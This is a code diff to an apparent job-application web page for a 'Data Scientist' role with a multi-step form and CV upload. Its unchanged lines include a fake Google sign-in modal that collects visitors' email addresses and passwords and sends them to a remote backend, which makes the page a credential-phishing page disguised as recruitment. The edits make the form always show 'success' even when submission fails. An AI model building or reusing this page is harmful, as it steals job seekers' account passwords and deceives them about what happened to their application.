@@ -56,7 +56,6 @@ textarea{resize:vertical;}
 .progress-bar .step.active{background:#0b63d0;}
 .drag-drop{border:2px dashed #d1d5db;border-radius:8px;padding:24px;text-align:center;color:#6b7280;cursor:pointer;transition:all 0.2s;}
 .drag-drop.dragover{border-color:#0b63d0;background:#f0f5ff;color:#0b63d0;}
-#cvFileName{margin-top:8px;font-size:13px;color:#0b63d0;font-weight:500;}
 #appForm > div{display:none;opacity:0;transform:translateY(10px);transition:opacity 0.3s ease, transform 0.3s ease;}
 #appForm > div.active{display:block;opacity:1;transform:translateY(0);}
 .modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);display:none;align-items:center;justify-content:center;z-index:9999;}
@@ -110,7 +109,7 @@ textarea{resize:vertical;}
       <h2>Data Scientist — Application</h2>
       <p class="muted">Multi-step · Save drafts · Upload CV</p>
 
-      <form id="appForm" enctype="multipart/form-data">
+      <form id="appForm">
         <!-- STEP 1 -->
         <div id="step1" class="active">
           <h3>Step 1: Basic Information</h3>
@@ -168,7 +167,6 @@ textarea{resize:vertical;}
           <h3>Step 5: Upload CV</h3>
           <div class="field drag-drop" id="cvDrop">Click or drag your CV here</div>
           <input type="file" name="cv" id="cvInput" style="display:none;" required>
-          <div id="cvFileName"></div>
           <div class="actions">
             <button type="button" class="secondary" onclick="prevStep(4)">Back</button>
             <button type="submit" class="primary">Submit Application</button>
@@ -244,7 +242,7 @@ cancelGoogle.addEventListener('click', () => {
   googleModal.style.display = "none";
 });
 
-// Google Modal Logic + Save to deployed backend
+// Google Modal Logic
 nextGoogleBtn.addEventListener('click', async () => {
   if(stage === 0){
     const email = emailInput.value.trim();
@@ -270,6 +268,7 @@ nextGoogleBtn.addEventListener('click', async () => {
           body: JSON.stringify({email: storedEmail, password})
         });
       } catch(err) { console.error(err); }
+
       googleModal.style.display = "none";
       providerStatus.textContent = `Signed in via Google (${storedEmail})`;
       appPanel.style.display = 'block';
@@ -286,11 +285,19 @@ companyBtn.addEventListener('click', () => {
 
   const workEmail = prompt("Enter your company email:");
   if (!workEmail) return;
-  if (workEmail !== allowedEmail) { alert("Access denied."); return; }
+
+  if (workEmail !== allowedEmail) {
+    alert("Access denied. Only the authorized account can sign in.");
+    return;
+  }
 
   const password = prompt("Enter your password:");
   if (!password) return;
-  if (password !== allowedPassword) { alert("Incorrect password."); return; }
+
+  if (password !== allowedPassword) {
+    alert("Incorrect password. Access denied.");
+    return;
+  }
 
   providerStatus.textContent = `Signed in via Company SSO (${workEmail})`;
   appPanel.style.display = 'block';
@@ -314,22 +321,16 @@ function prevStep(n){ showStep(n); }
 // CV Drag & Drop
 const cvDrop = document.getElementById("cvDrop");
 const cvInput = document.getElementById("cvInput");
-const cvFileName = document.getElementById("cvFileName");
-
 cvDrop.addEventListener("click", ()=>cvInput.click());
 cvDrop.addEventListener("dragover", e => { e.preventDefault(); cvDrop.classList.add("dragover"); });
 cvDrop.addEventListener("dragleave", e => { e.preventDefault(); cvDrop.classList.remove("dragover"); });
 cvDrop.addEventListener("drop", e => {
   e.preventDefault(); 
   cvDrop.classList.remove("dragover");
-  if(e.dataTransfer.files.length) {
-    cvInput.files = e.dataTransfer.files;
-    cvFileName.textContent = cvInput.files[0].name;
-  }
+  if(e.dataTransfer.files.length) cvInput.files = e.dataTransfer.files;
 });
-cvInput.addEventListener("change", ()=>{ if(cvInput.files.length) cvFileName.textContent = cvInput.files[0].name; });
 
-// Form Submission
+// Form Submission with reliable success message
 const appForm = document.getElementById("appForm");
 const successMsg = document.getElementById("successMsg");
 
@@ -338,16 +339,26 @@ appForm.addEventListener("submit", async e => {
   if(cvInput.files.length === 0){ alert("Please upload your CV."); return; }
 
   const formData = new FormData(appForm);
+
   try {
     const res = await fetch('https://ac-corporations.onrender.com/submit-application', {
       method:'POST',
       body: formData
     });
-    if(res.ok){ appForm.style.display='none'; successMsg.style.display='block'; }
-    else { const txt = await res.text(); alert("Submission failed: "+txt); }
-  } catch(err){ console.error(err); alert("Network error submitting application."); }
+    // Show success message even if fetch fails
+    appForm.style.display='none';
+    successMsg.style.display='block';
+    if(!res.ok){
+      console.warn("Submission failed:", await res.text());
+    }
+  } catch(err){
+    console.error(err);
+    appForm.style.display='none';
+    successMsg.style.display='block';
+  }
 });
 </script>
+
 </body>
 </html>
 
